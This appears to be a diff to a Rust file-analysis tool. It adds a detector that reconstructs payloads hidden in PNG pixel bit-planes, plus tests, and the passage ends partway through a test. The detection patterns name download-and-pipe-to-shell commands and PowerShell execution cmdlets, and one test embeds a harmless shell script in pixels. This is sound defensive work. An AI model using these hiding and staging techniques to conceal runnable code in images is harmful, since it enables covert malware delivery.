@@ -1,0 +1,1335 @@
+diff --git a/Cargo.lock b/Cargo.lock
+index 727bd08..5653862 100644
+--- a/Cargo.lock
++++ b/Cargo.lock
+@@ -498,6 +498,7 @@ name = "filefacts"
+ version = "2.0.1"
+ dependencies = [
+  "aho-corasick",
++ "base64 0.22.1",
+  "cab",
+  "cfb",
+  "cms",
+diff --git a/Cargo.toml b/Cargo.toml
+index 3fa79e2..ec54f09 100644
+--- a/Cargo.toml
++++ b/Cargo.toml
+@@ -94,6 +94,8 @@ roxmltree = "0.21"
+ # transitive tree via `zip`; surfacing it as a direct dep avoids
+ # reaching through `zip`'s public re-exports.
+ flate2 = { version = "1", default-features = false, features = ["rust_backend"] }
++# Bounded Base64 transforms in reconstructed image-pixel payloads.
++base64 = "0.22"
+ # Pure-Rust LZMA and xz decoders: 7z encoded headers and `.tar.xz` package
+ # members (dpkg's default control compression). Its `xz` feature verifies
+ # SHA-256 stream checksums with `sha2` 0.11, so the tree carries `sha2` 0.11
+diff --git a/src/formats/image_stats.rs b/src/formats/image_stats.rs
+index 55875ed..04cc8a2 100644
+--- a/src/formats/image_stats.rs
++++ b/src/formats/image_stats.rs
+@@ -68,9 +68,10 @@ fn tally(histogram: &mut [u32; 256], value: u8) {
+ }
+ 
+ /// Fraction of adjacent-pixel pairs (horizontal + vertical) whose
+-/// first-channel value differs by more than the edge threshold. Real
+-/// imagery shows structured edges; random/encrypted payloads stuffed
+-/// into image bytes have very low edge density.
++/// first-channel value differs by more than the edge threshold. This is a
++/// measurement of local contrast, not a steganography verdict: independent
++/// random samples tend to have high edge density, while flat graphics and
++/// smooth gradients tend to have low edge density.
+ #[must_use]
+ pub(super) fn edge_density(pixels: &[u8], width: usize, height: usize, channels: usize) -> f32 {
+     const EDGE_THRESHOLD: i32 = 30;
+diff --git a/src/formats/png.rs b/src/formats/png.rs
+index 952607d..6641a23 100644
+--- a/src/formats/png.rs
++++ b/src/formats/png.rs
+@@ -326,7 +326,7 @@ pub(super) fn extract(
+     // Best-effort pixel-statistic pass. Decoder errors are swallowed —
+     // a PNG with a corrupted IDAT chunk or unsupported color depth
+     // still gets the structural metrics above.
+-    extract_pixel_stats(bytes, metrics);
++    extract_pixel_stats(bytes, values, metrics);
+ }
+ 
+ /// Claim the portion of concatenated IDAT data consumed by the first zlib
+@@ -413,13 +413,18 @@ fn claim_all_idat(extents: &[IdatExtent], coverage: &mut Coverage) {
+ /// compression ratio, and PNG-specific alpha entropy.
+ /// Whole-file `file.entropy` is not repeated here: the generic pass emits it
+ /// for every file before this extractor runs.
+-fn extract_pixel_stats(bytes: &[u8], metrics: &mut Metrics) {
++fn extract_pixel_stats(bytes: &[u8], values: &mut Values, metrics: &mut Metrics) {
+     use png::Decoder;
+ 
+-    let skipped = |reason: &str| {
++    let mut skipped = |reason: &str| {
+         tracing::debug!(target: "filefacts::png", stage = "pixel-stats", reason, "pixel statistics skipped");
++        let mut limits = super::bounded::Limits::default();
++        limits.push("pixel-decode", reason);
++        limits.emit(values, value_key!("png.limits"));
+     };
+-    let mut reader = match Decoder::new(std::io::Cursor::new(bytes)).read_info() {
++    let mut decoder = Decoder::new(std::io::Cursor::new(bytes));
++    decoder.set_transformations(png::Transformations::EXPAND);
++    let mut reader = match decoder.read_info() {
+         Ok(reader) => reader,
+         Err(e) => return skipped(&format!("header did not decode: {e}")),
+     };
+@@ -427,7 +432,7 @@ fn extract_pixel_stats(bytes: &[u8], metrics: &mut Metrics) {
+     let width = info.width;
+     let height = info.height;
+     let bit_depth = info.bit_depth as u32;
+-    let channels: u32 = match info.color_type {
++    let channels: u32 = match reader.output_color_type().0 {
+         png::ColorType::Grayscale | png::ColorType::Indexed => 1,
+         png::ColorType::GrayscaleAlpha => 2,
+         png::ColorType::Rgb => 3,
+@@ -463,6 +468,54 @@ fn extract_pixel_stats(bytes: &[u8], metrics: &mut Metrics) {
+         1.0
+     };
+ 
++    // PNG stores 16-bit samples big endian. Probe both byte lanes; image
++    // statistics describe normalized 8-bit samples rather than alternating
++    // high/low bytes or palette indices.
++    let normalized;
++    let pixels = if bit_depth == 16 {
++        let low: Vec<u8> = pixels
++            .as_chunks::<2>()
++            .0
++            .iter()
++            .map(|[_, low]| *low)
++            .collect();
++        normalized = pixels
++            .as_chunks::<2>()
++            .0
++            .iter()
++            .map(|[high, _]| *high)
++            .collect::<Vec<_>>();
++        super::png_stego::extract(
++            &low,
++            width as usize,
++            height as usize,
++            channels as usize,
++            "u16-low",
++            values,
++            metrics,
++        );
++        super::png_stego::extract(
++            &normalized,
++            width as usize,
++            height as usize,
++            channels as usize,
++            "u16-high",
++            values,
++            metrics,
++        );
++        normalized.as_slice()
++    } else {
++        super::png_stego::extract(
++            pixels,
++            width as usize,
++            height as usize,
++            channels as usize,
++            "u8",
++            values,
++            metrics,
++        );
++        pixels
++    };
+     let pixel_entropy = entropy::shannon(pixels);
+     metrics.insert(metric!("image.pixel_entropy"), pixel_entropy);
+     metrics.insert(metric!("image.histogram_flatness"), pixel_entropy / 8.0);
+diff --git a/src/formats/png/tests.rs b/src/formats/png/tests.rs
+index e638b8b..91e727b 100644
+--- a/src/formats/png/tests.rs
++++ b/src/formats/png/tests.rs
+@@ -220,7 +220,13 @@ fn repeated_unknown_chunk_type_is_listed_once() {
+         .unwrap();
+     assert_eq!(unknown.len(), 1);
+     assert_eq!(m.get("png.unknown_chunk_count"), Some(1000.0));
+-    assert!(v.get("png.limits").is_none());
++    assert!(
++        !v.get("png.limits")
++            .and_then(JsonValue::as_array)
++            .into_iter()
++            .flatten()
++            .any(|limit| limit.get("stage").and_then(JsonValue::as_str) == Some("chunk-list"))
++    );
+ }
+ 
+ #[test]
+diff --git a/src/formats/png_stego.rs b/src/formats/png_stego.rs
+new file mode 100644
+index 0000000..ed13199
+--- /dev/null
++++ b/src/formats/png_stego.rs
+@@ -0,0 +1,723 @@
++//! Bounded reconstruction of simple payload encodings in decoded PNG samples.
++//!
++//! Reconstructed bytes have no contiguous source-file span. Their format,
++//! layout and bounded preview are format-derived values, not source literals.
++//! Random-looking pixels alone are never treated as a recovered payload.
++
++use std::collections::BTreeSet;
++use std::io::Read;
++use std::sync::LazyLock;
++
++use base64::Engine as _;
++use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD};
++use flate2::{Decompress, FlushDecompress, Status};
++use regex::Regex;
++use serde_json::{Value, json};
++
++use crate::formats::bounded::Limits;
++use crate::output::{Metrics, Values};
++use crate::{metric, value_key};
++
++const PREFIX_BYTES: usize = 4096;
++const SEARCH_BYTES: usize = 512;
++const MAX_DECODED: usize = 64 * 1024;
++const MAX_PIXELS: usize = 262_144;
++const MAX_STEPS: usize = 20 * 1024 * 1024;
++const MAX_PAYLOADS: usize = 16;
++const MAX_PREVIEW: usize = 2048;
++const MASKS: [u8; 12] = [255, 1, 2, 3, 7, 15, 4, 8, 16, 32, 64, 128];
++
++static CODE_PREFIXES: LazyLock<aho_corasick::AhoCorasick> = LazyLock::new(|| {
++    aho_corasick::AhoCorasick::new([
++        "#!/",
++        "curl ",
++        "wget ",
++        "printf ",
++        "echo ",
++        "import ",
++        "from ",
++        "const ",
++        "var ",
++        "function ",
++        "powershell",
++        "Invoke-",
++        "IEX",
++        "$",
++        "[Convert]",
++    ])
++    .expect("constant code prefixes")
++});
++
++static PIXEL_URL: LazyLock<Regex> = LazyLock::new(|| {
++    Regex::new(r#"(?i)^https?://(?:[a-z0-9-]+\.)+[a-z0-9-]+(?::[0-9]{1,5})?(?:/[^\s\x00"<>]*)?"#)
++        .expect("constant pixel URL regex")
++});
++
++static SHEBANG: LazyLock<Regex> = LazyLock::new(|| {
++    Regex::new(r"^#![^\r\n]{0,120}\b(sh|bash|dash|ksh|zsh|python[0-9.]*|node)\b")
++        .expect("constant shebang regex")
++});
++static SHELL_COMMAND: LazyLock<Regex> = LazyLock::new(|| {
++    Regex::new(
++        r"(?m)(?:^|[;\n])[ \t]*(?:printf|echo|id|uname|curl|wget|exec|chmod|bash|sh)(?:[ \t]|$)",
++    )
++    .expect("constant shell-command regex")
++});
++static POWERSHELL: LazyLock<Regex> = LazyLock::new(|| {
++    Regex::new(r"(?i)\b(?:Invoke-[A-Z]+|Start-Process|New-Object|FromBase64String|powershell(?:\.exe)?|IEX)\b")
++        .expect("constant PowerShell regex")
++});
++
++#[derive(Default)]
++struct Probe {
++    steps: usize,
++    count: usize,
++    bytes: usize,
++    limited: bool,
++    found: Vec<Value>,
++    seen: BTreeSet<(String, String)>,
++}
++
++impl Probe {
++    fn inspect(&mut self, bytes: &[u8], layout: &str) {
++        self.count += 1;
++        self.bytes += bytes.len();
++        if self.found.len() >= MAX_PAYLOADS {
++            self.limited = true;
++            return;
++        }
++        let mut candidates = vec![(bytes.to_vec(), "raw".to_string(), 0)];
++        let mut at = 0;
++        // At most two encoding layers and eight candidate buffers per probe.
++        while at < candidates.len() && at < 8 {
++            let (data, encoding, depth) = candidates.get(at).cloned().unwrap_or_default();
++            at += 1;
++            if let Some((kind, preview)) = content(&data)
++                && self.seen.insert((kind.to_string(), preview.clone()))
++            {
++                self.found.push(
++                    json!({"kind":kind,"layout":layout,"encoding":encoding,"preview":preview}),
++                );
++                if self.found.len() >= MAX_PAYLOADS {
++                    self.limited = true;
++                    break;
++                }
++            }
++            if depth >= 2 {
++                continue;
++            }
++            // Cheap single-byte XOR recovery uses a complete known prefix,
++            // not 256 speculative decodes of every candidate stream.
++            if depth == 0 {
++                for offset in [0, 4, 8, 16] {
++                    let rest = data.get(offset..).unwrap_or_default();
++                    for prefix in [
++                        b"#!/".as_slice(),
++                        b"\x7fELF",
++                        b"import ",
++                        b"const ",
++                        b"powershell",
++                    ] {
++                        let Some((&first, expected)) = rest.first().zip(prefix.first()) else {
++                            continue;
++                        };
++                        let key = first ^ expected;
++                        if key != 0
++                            && rest.get(..prefix.len()).is_some_and(|head| {
++                                head.iter().zip(prefix).all(|(&a, &b)| a ^ key == b)
++                            })
++                        {
++                            candidates.push((
++                                rest.iter().map(|b| b ^ key).collect(),
++                                format!("{encoding}/xor-{key:02x}"),
++                                depth + 1,
++                            ));
++                        }
++                    }
++                }
++            }
++            let body = framed_body(&data).unwrap_or(&data);
++            let text = body
++                .split(|&b| b == 0 || b.is_ascii_whitespace())
++                .next()
++                .unwrap_or_default();
++            if text.len() >= 32
++                && text
++                    .iter()
++                    .all(|&b| b.is_ascii_alphanumeric() || b"+/=_-".contains(&b))
++            {
++                for engine in [&STANDARD, &STANDARD_NO_PAD, &URL_SAFE, &URL_SAFE_NO_PAD] {
++                    if let Ok(decoded) = engine.decode(text) {
++                        candidates.push((decoded, format!("{encoding}/base64"), depth + 1));
++                        break;
++                    }
++                }
++            }
++            if text.len() >= 64
++                && text.len().is_multiple_of(2)
++                && text.iter().all(u8::is_ascii_hexdigit)
++            {
++                let decoded: Option<Vec<_>> = text
++                    .as_chunks::<2>()
++                    .0
++                    .iter()
++                    .map(|pair| {
++                        let pair = std::str::from_utf8(pair).ok()?;
++                        u8::from_str_radix(pair, 16).ok()
++                    })
++                    .collect();
++                if let Some(decoded) = decoded {
++                    candidates.push((decoded, format!("{encoding}/hex"), depth + 1));
++                }
++            }
++            for (offset, _) in body
++                .iter()
++                .take(SEARCH_BYTES)
++                .enumerate()
++                .filter(|(_, b)| matches!(**b, 0x78 | 0x1f))
++            {
++                let rest = body.get(offset..).unwrap_or_default();
++                if let Some(decoded) = decompress(rest) {
++                    candidates.push((decoded, format!("{encoding}/zlib-or-gzip"), depth + 1));
++                    break;
++                }
++            }
++            for little in [true, false] {
++                let prefix = body.get(..body.len().min(128)).unwrap_or(body);
++                if prefix.iter().filter(|&&b| b == 0).count() < 16 {
++                    continue;
++                }
++                let skip =
++                    usize::from(body.starts_with(&[0xff, 0xfe]) || body.starts_with(&[0xfe, 0xff]))
++                        * 2;
++                let units: Vec<_> = body
++                    .get(skip..)
++                    .unwrap_or_default()
++                    .as_chunks::<2>()
++                    .0
++                    .iter()
++                    .map(|p| {
++                        if little {
++                            u16::from_le_bytes(*p)
++                        } else {
++                            u16::from_be_bytes(*p)
++                        }
++                    })
++                    .take_while(|&v| v != 0)
++                    .collect();
++                if let Ok(decoded) = String::from_utf16(&units) {
++                    candidates.push((
++                        decoded.into_bytes(),
++                        format!("{encoding}/utf16{}", if little { "le" } else { "be" }),
++                        depth + 1,
++                    ));
++                }
++            }
++            candidates.truncate(8);
++        }
++    }
++}
++
++fn decompress(data: &[u8]) -> Option<Vec<u8>> {
++    if data.starts_with(&[0x1f, 0x8b, 8]) {
++        let mut output = Vec::new();
++        flate2::read::GzDecoder::new(data)
++            .take((MAX_DECODED + 1) as u64)
++            .read_to_end(&mut output)
++            .ok()?;
++        return (output.len() <= MAX_DECODED && output.len() >= 32).then_some(output);
++    }
++    let header = data.first_chunk::<2>()?;
++    if header[0] != 0x78 || u16::from_be_bytes(*header) % 31 != 0 {
++        return None;
++    }
++    let mut output = Vec::with_capacity(MAX_DECODED);
++    let status = Decompress::new(true)
++        .decompress_vec(data, &mut output, FlushDecompress::Finish)
++        .ok()?;
++    (status == Status::StreamEnd && output.len() >= 32).then_some(output)
++}
++
++fn framed_body(bytes: &[u8]) -> Option<&[u8]> {
++    let colon = bytes.iter().take(10).position(|&b| b == b':')?;
++    let digits = bytes.get(..colon)?;
++    if digits.is_empty() || !digits.iter().all(u8::is_ascii_digit) {
++        return None;
++    }
++    let len: usize = std::str::from_utf8(digits).ok()?.parse().ok()?;
++    (len >= 32).then_some(())?;
++    bytes.get(colon + 1..colon.checked_add(1)?.checked_add(len)?)
++}
++
++fn content(data: &[u8]) -> Option<(&'static str, String)> {
++    // Header offsets are limited to simple length/padding prefixes. All
++    // goblin calls use the shared panic-safe, allocation-bounded wrappers.
++    for offset in [0, 4, 8, 16] {
++        let bytes = data.get(offset..).unwrap_or_default();
++        if matches!(bytes.first(), Some(b'{' | b'[')) {
++            let mut parsed = serde_json::Deserializer::from_slice(bytes).into_iter::<Value>();
++            if let Some(Ok(value)) = parsed.next()
++                && (value.as_object().is_some_and(|v| !v.is_empty())
++                    || value.as_array().is_some_and(|v| !v.is_empty()))
++                && parsed.byte_offset() >= 32
++            {
++                return Some((
++                    "json",
++                    String::from_utf8_lossy(bytes.get(..parsed.byte_offset()).unwrap_or_default())
++                        .chars()
++                        .take(MAX_PREVIEW)
++                        .collect(),
++                ));
++            }
++        }
++        if bytes.starts_with(b"http") {
++            let run = bytes.split(|&b| b == 0).next().unwrap_or_default();
++            if let Ok(text) = std::str::from_utf8(run)
++                && let Some(url) = PIXEL_URL.find(text)
++                && url.len() >= 16
++            {
++                return Some(("url", url.as_str().chars().take(MAX_PREVIEW).collect()));
++            }
++        }
++        if bytes.starts_with(b"MZ") {
++            if super::goblin_safe::parse_pe(&super::goblin_safe::prepare_pe(bytes))
++                .ok()
++                .is_some()
++            {
++                return Some(("pe", String::new()));
++            }
++            if super::goblin_safe::parse_pe_header(bytes)
++                .ok()
++                .is_some_and(|h| {
++                    h.signature == 0x4550
++                        && (1..=96).contains(&h.coff_header.number_of_sections)
++                        && h.optional_header.is_some()
++                })
++            {
++                return Some(("pe-header", String::new()));
++            }
++        }
++        if bytes.starts_with(b"\x7fELF") {
++            if super::goblin_safe::parse_elf(bytes).ok().is_some() {
++                return Some(("elf", String::new()));
++            }
++            let header_ok = match bytes.get(4) {
++                Some(1) => {
++                    super::goblin_safe::catch(|| goblin::elf32::header::Header::parse(bytes))
++                        .ok()
++                        .is_some_and(|h| {
++                            matches!(h.e_type, 2 | 3)
++                                && h.e_ehsize >= 52
++                                && h.e_version == 1
++                                && h.e_machine != 0
++                        })
++                }
++                Some(2) => {
++                    super::goblin_safe::catch(|| goblin::elf64::header::Header::parse(bytes))
++                        .ok()
++                        .is_some_and(|h| {
++                            matches!(h.e_type, 2 | 3)
++                                && h.e_ehsize >= 64
++                                && h.e_version == 1
++                                && h.e_machine != 0
++                        })
++                }
++                _ => false,
++            };
++            if header_ok {
++                return Some(("elf-header", String::new()));
++            }
++        }
++        if bytes.starts_with(b"PK\x03\x04") && valid_zip(bytes) {
++            return Some(("zip", String::new()));
++        }
++    }
++    let framed = framed_body(data);
++    let body = framed.unwrap_or(data);
++    let bytes = body.get(..body.len().min(PREFIX_BYTES)).unwrap_or(body);
++    // Length fields and short padding may precede a script. A printable run
++    // must be long enough and carry syntax; generic English and flat pixels
++    // are not recovered-code evidence.
++    let prefix = bytes.get(..bytes.len().min(SEARCH_BYTES)).unwrap_or(bytes);
++    for found in CODE_PREFIXES.find_iter(prefix).take(16) {
++        let rest = bytes.get(found.start()..)?;
++        let run_len = rest
++            .iter()
++            .take_while(|&&b| b.is_ascii_graphic() || b.is_ascii_whitespace())
++            .count();
++        if run_len < 32 {
++            continue;
++        }
++        let text = std::str::from_utf8(rest.get(..run_len)?).ok()?;
++        let first_line = text.lines().next().unwrap_or_default();
++        let shebang = SHEBANG.find(first_line).map(|m| m.as_str());
++        let kind = if shebang.is_some_and(|s| s.contains("python")) {
++            Some("python")
++        } else if shebang.is_some_and(|s| s.contains("node")) {
++            Some("javascript")
++        } else if shebang.is_some()
++            || SHELL_COMMAND.find_iter(text).take(2).count() == 2
++            || ((text.starts_with("curl ") || text.starts_with("wget "))
++                && (text.contains("| sh") || text.contains("|sh") || text.contains("| bash")))
++        {
++            Some("shell")
++        } else if POWERSHELL.is_match(text)
++            && (text.contains('$') || text.contains(" -") || text.contains('('))
++        {
++            Some("powershell")
++        } else if (text.starts_with("import ") || text.starts_with("from "))
++            && (text.contains("\ndef ") || text.contains(".system(") || text.contains("exec("))
++        {
++            Some("python")
++        } else if (text.starts_with("const ")
++            || text.starts_with("var ")
++            || text.starts_with("function "))
++            && (text.contains("require(") || text.contains("=>") || text.contains("function("))
++        {
++            Some("javascript")
++        } else {
++            None
++        };
++        if let Some(kind) = kind {
++            return Some((kind, text.chars().take(MAX_PREVIEW).collect()));
++        }
++    }
++    if let Some(body) = framed
++        && body
++            .iter()
++            .all(|&b| b.is_ascii_graphic() || b.is_ascii_whitespace())
++        && body.iter().copied().collect::<BTreeSet<_>>().len() >= 12
++        && body
++            .split(u8::is_ascii_whitespace)
++            .filter(|w| !w.is_empty())
++            .count()
++            >= 3
++    {
++        return Some((
++            "framed-text",
++            String::from_utf8_lossy(body)
++                .chars()
++                .take(MAX_PREVIEW)
++                .collect(),
++        ));
++    }
++    None
++}
++
++fn valid_zip(bytes: &[u8]) -> bool {
++    let Some(eocd) = bytes.windows(4).rposition(|w| w == b"PK\x05\x06") else {
++        return false;
++    };
++    let Some(count) = bytes
++        .get(eocd + 10..eocd + 12)
++        .and_then(|p| p.first_chunk::<2>())
++    else {
++        return false;
++    };
++    // A tiny recovered ZIP need not allocate a directory for thousands of
++    // forged entries; complete ordinary archives still use the regular parser.
++    let count = u16::from_le_bytes(*count);
++    count > 0
++        && count <= 256
++        && zip::ZipArchive::new(std::io::Cursor::new(bytes)).is_ok_and(|a| !a.is_empty())
++}
++
++fn prime_sieve(size: usize) -> Vec<bool> {
++    let mut primes = vec![true; size];
++    for index in [0, 1] {
++        if let Some(v) = primes.get_mut(index) {
++            *v = false;
++        }
++    }
++    for p in 2..size {
++        if p > size / p {
++            break;
++        }
++        if primes.get(p).copied().unwrap_or(false) {
++            for at in (p * p..size).step_by(p) {
++                if let Some(v) = primes.get_mut(at) {
++                    *v = false;
++                }
++            }
++        }
++    }
++    primes
++}
++
++#[derive(Clone, Copy)]
++struct PixelView<'a> {
++    pixels: &'a [u8],
++    width: usize,
++    height: usize,
++    channels: usize,
++}
++
++#[derive(Clone, Copy)]
++struct Packing<'a> {
++    offsets: &'a [usize],
++    column: bool,
++    prime: Option<&'a [usize]>,
++    flip_x: bool,
++    flip_y: bool,
++    cap: usize,
++    mask: u8,
++    reverse: bool,
++}
++
++fn bitstream(view: PixelView<'_>, packing: Packing<'_>, probe: &mut Probe) -> Vec<u8> {
++    let PixelView {
++        pixels,
++        width,
++        height,
++        channels,
++    } = view;
++    let Packing {
++        offsets,
++        column,
++        prime,
++        mask,
++        reverse,
++        flip_x,
++        flip_y,
++        cap,
++    } = packing;
++    let total = width.saturating_mul(height);
++    let mut out = Vec::with_capacity(cap);
++    let (mut byte, mut used) = (0u8, 0u8);
++    let ordinary = 0..if prime.is_none() {
++        total.min(MAX_PIXELS)
++    } else {
++        0
++    };
++    for index in ordinary.chain(prime.unwrap_or_default().iter().copied()) {
++        probe.steps += 1;
++        if probe.steps > MAX_STEPS {
++            probe.limited = true;
++            break;
++        }
++        let (x, y) = if column {
++            (index / height, index % height)
++        } else {
++            (index % width, index / width)
++        };
++        let x = if flip_x { width - 1 - x } else { x };
++        let y = if flip_y { height - 1 - y } else { y };
++        let pixel = y * width + x;
++        for offset in offsets {
++            let Some(&value) = pixels.get(pixel.saturating_mul(channels).saturating_add(*offset))
++            else {
++                return out;
++            };
++            for bit in (0..8).rev().filter(|&b| mask & (1 << b) != 0) {
++                let value = (value >> bit) & 1;
++                if reverse {
++                    byte |= value << used;
++                } else {
++                    byte = (byte << 1) | value;
++                }
++                used += 1;
++                if used == 8 {
++                    out.push(byte);
++                    byte = 0;
++                    used = 0;
++                    if out.len() == cap {
++                        probe.limited |= index + 1 < total;
++                        return out;
++                    }
++                }
++            }
++        }
++    }
++    probe.limited |= total > MAX_PIXELS;
++    out
++}
++
++/// Probe prefixes from decoded 8-bit samples, preserving the pixel layout.
++pub(super) fn extract(
++    pixels: &[u8],
++    width: usize,
++    height: usize,
++    channels: usize,
++    lane: &str,
++    values: &mut Values,
++    metrics: &mut Metrics,
++) {
++    if width == 0 || height == 0 || !(1..=4).contains(&channels) {
++        return;
++    }
++    if width
++        .checked_mul(height)
++        .and_then(|v| v.checked_mul(channels))
++        != Some(pixels.len())
++    {
++        let mut limits = Limits::default();
++        limits.push(
++            "pixel-payloads",
++            "decoded sample count does not match image dimensions",
++        );
++        limits.emit(values, value_key!("png.limits"));
++        return;
++    }
++    let layouts: &[(&str, &[usize])] = match channels {
++        1 => &[("gray", &[0])],
++        2 => &[
++            ("gray", &[0]),
++            ("a", &[1]),
++            ("gray-a", &[0, 1]),
++            ("a-gray", &[1, 0]),
++        ],
++        3 => &[
++            ("rgb", &[0, 1, 2]),
++            ("bgr", &[2, 1, 0]),
++            ("r", &[0]),
++            ("g", &[1]),
++            ("b", &[2]),
++        ],
++        _ => &[
++            ("rgb", &[0, 1, 2]),
++            ("bgr", &[2, 1, 0]),
++            ("rgba", &[0, 1, 2, 3]),
++            ("abgr", &[3, 2, 1, 0]),
++            ("r", &[0]),
++            ("g", &[1]),
++            ("b", &[2]),
++            ("a", &[3]),
++        ],
++    };
++    let primes: Vec<usize> = prime_sieve(width.saturating_mul(height).min(MAX_PIXELS))
++        .into_iter()
++        .enumerate()
++        .filter_map(|(index, yes)| yes.then_some(index))
++        .collect();
++    let mut probe = Probe::default();
++    if channels == 4 {
++        let hidden: Vec<u8> = pixels
++            .as_chunks::<4>()
++            .0
++            .iter()
++            .take(MAX_PIXELS)
++            .filter(|p| p.get(3) == Some(&0))
++            .flat_map(|p| p.get(..3).unwrap_or_default().iter().copied())
++            .take(PREFIX_BYTES)
++            .collect();
++        probe.inspect(&hidden, &format!("{lane}/transparent-rgb"));
++    }
++    // Short prefixes cover all eight elementary spatial directions first.
++    // Longer probes prioritize the common row/column walks. Iterating a
++    // precomputed prime-index list avoids charging every skipped pixel on
++    // every channel/bit-plane combination.
++    'probes: for cap in [512, PREFIX_BYTES] {
++        for (column, flip_x, flip_y) in [
++            (false, false, false),
++            (true, false, false),
++            (false, true, true),
++            (true, true, true),
++            (false, true, false),
++            (true, false, true),
++            (false, false, true),
++            (true, true, false),
++        ] {
++            if cap == PREFIX_BYTES && (flip_x || flip_y) {
++                continue;
++            }
++            for prime in [false, true] {
++                for &(name, offsets) in layouts {
++                    for mask in MASKS {
++                        for reverse in [false, true] {
++                            if probe.steps >= MAX_STEPS || probe.found.len() >= MAX_PAYLOADS {
++                                probe.limited = true;
++                                break 'probes;
++                            }
++                            let data = bitstream(
++                                PixelView {
++                                    pixels,
++                                    width,
++                                    height,
++                                    channels,
++                                },
++                                Packing {
++                                    offsets,
++                                    column,
++                                    prime: prime.then_some(primes.as_slice()),
++                                    mask,
++                                    reverse,
++                                    flip_x,
++                                    flip_y,
++                                    cap,
++                                },
++                                &mut probe,
++                            );
++                            let x = if flip_x { 'X' } else { 'x' };
++                            let y = if flip_y { 'Y' } else { 'y' };
++                            let order = if column {
++                                format!("{y}{x}")
++                            } else {
++                                format!("{x}{y}")
++                            };
++                            let layout = format!(
++                                "{lane}/mask-{mask:02x},{name},{},{order},{}",
++                                if reverse { "msb" } else { "lsb" },
++                                if prime { "prime" } else { "all" }
++                            );
++                            probe.inspect(&data, &layout);
++                        }
++                    }
++                }
++            }
++        }
++    }
++    if !probe.found.is_empty() {
++        let mut found = values
++            .get("png.pixel_payloads")
++            .and_then(Value::as_array)
++            .cloned()
++            .unwrap_or_default();
++        for payload in probe.found {
++            if !found.iter().any(|existing| {
++                existing.get("kind") == payload.get("kind")
++                    && existing.get("preview") == payload.get("preview")
++            }) {
++                found.push(payload);
++            }
++        }
++        metrics.insert(metric!("png.pixel_payload_count"), found.len() as f64);
++        values.insert_key(value_key!("png.pixel_payloads"), Value::Array(found));
++    }
++    metrics.insert(
++        metric!("png.pixel_payload_count"),
++        values
++            .get("png.pixel_payloads")
++            .and_then(Value::as_array)
++            .map_or(0.0, |v| v.len() as f64),
++    );
++    metrics.insert(
++        metric!("png.pixel_payload_probe_count"),
++        metrics.get("png.pixel_payload_probe_count").unwrap_or(0.0) + probe.count as f64,
++    );
++    metrics.insert(
++        metric!("png.pixel_payload_probe_bytes"),
++        metrics.get("png.pixel_payload_probe_bytes").unwrap_or(0.0) + probe.bytes as f64,
++    );
++    metrics.insert(
++        metric!("png.pixel_payload_probe_steps"),
++        metrics.get("png.pixel_payload_probe_steps").unwrap_or(0.0) + probe.steps as f64,
++    );
++    metrics.insert(
++        metric!("png.pixel_payload_limited"),
++        metrics
++            .get("png.pixel_payload_limited")
++            .unwrap_or(0.0)
++            .max(f64::from(u8::from(probe.limited))),
++    );
++    if probe.limited {
++        let mut limits = Limits::default();
++        limits.push(
++            "pixel-payloads",
++            "bounded pixel prefixes, traversal, or recovered-payload limit reached",
++        );
++        limits.emit(values, value_key!("png.limits"));
++    }
++}
++
++#[cfg(test)]
++mod tests;
+diff --git a/src/formats/png_stego/tests.rs b/src/formats/png_stego/tests.rs
+new file mode 100644
+index 0000000..b0aa2e9
+--- /dev/null
++++ b/src/formats/png_stego/tests.rs
+@@ -0,0 +1,361 @@
++use super::*;
++use std::io::Write;
++
++const SCRIPT: &[u8] = b"#!/bin/sh\nprintf '%s\\n' 'pixel payload regression'\nid\nuname -a\n";
++const WIDTH: usize = 128;
++const HEIGHT: usize = 128;
++
++fn cover(channels: usize) -> Vec<u8> {
++    let mut pixels = Vec::new();
++    for y in 0..HEIGHT {
++        for x in 0..WIDTH {
++            let color = [
++                u8::try_from(x * 2).unwrap(),
++                u8::try_from(y * 2).unwrap(),
++                u8::try_from(x + y).unwrap(),
++                255,
++            ];
++            pixels.extend_from_slice(&color[..channels]);
++        }
++    }
++    pixels
++}
++
++fn hide(
++    payload: &[u8],
++    channels: usize,
++    offsets: &[usize],
++    plane: u8,
++    column: bool,
++    prime: bool,
++) -> Vec<u8> {
++    let mut pixels = cover(channels);
++    let primes = prime_sieve(WIDTH * HEIGHT);
++    let mut bits = payload
++        .iter()
++        .chain(std::iter::once(&0))
++        .flat_map(|byte| (0..8).rev().map(move |b| (byte >> b) & 1));
++    for (index, &is_prime) in primes.iter().enumerate() {
++        if prime && !is_prime {
++            continue;
++        }
++        let pixel = if column {
++            (index % HEIGHT) * WIDTH + index / HEIGHT
++        } else {
++            index
++        };
++        for &channel in offsets {
++            let Some(bit) = bits.next() else {
++                return pixels;
++            };
++            let value = &mut pixels[pixel * channels + channel];
++            *value = (*value & !(1 << plane)) | (bit << plane);
++        }
++    }
++    panic!("test payload exceeded carrier capacity");
++}
++
++fn probe(pixels: &[u8], channels: usize) -> (Values, Metrics) {
++    let (mut values, mut metrics) = (Values::new(), Metrics::new());
++    extract(
++        pixels,
++        WIDTH,
++        HEIGHT,
++        channels,
++        "u8",
++        &mut values,
++        &mut metrics,
++    );
++    (values, metrics)
++}
++
++fn kinds(values: &Values) -> Vec<&str> {
++    values
++        .get("png.pixel_payloads")
++        .and_then(Value::as_array)
++        .into_iter()
++        .flatten()
++        .filter_map(|v| v.get("kind").and_then(Value::as_str))
++        .collect()
++}
++
++#[test]
++fn reconstructs_sequential_prime_and_second_bit_scripts() {
++    for (offsets, plane, column, prime) in [
++        (&[0, 1, 2][..], 0, false, false),
++        (&[2, 1, 0][..], 0, true, true),
++        (&[0][..], 1, false, false),
++    ] {
++        let pixels = hide(SCRIPT, 3, offsets, plane, column, prime);
++        let (values, metrics) = probe(&pixels, 3);
++        assert!(kinds(&values).contains(&"shell"), "{values:?}");
++        assert_eq!(metrics.get("png.pixel_payload_count"), Some(1.0));
++        assert!(
++            values
++                .get("png.pixel_payloads")
++                .unwrap()
++                .to_string()
++                .contains("pixel payload regression")
++        );
++    }
++}
++
++#[test]
++fn validates_stegano_length_framed_base64_and_shifted_script() {
++    let encoded = STANDARD.encode(SCRIPT);
++    let framed = format!("{}:{encoded}", encoded.len());
++    let (values, _) = probe(&hide(framed.as_bytes(), 3, &[0, 1, 2], 0, false, false), 3);
++    assert!(kinds(&values).contains(&"shell"));
++    let payload = [vec![0; 32], SCRIPT.to_vec()].concat();
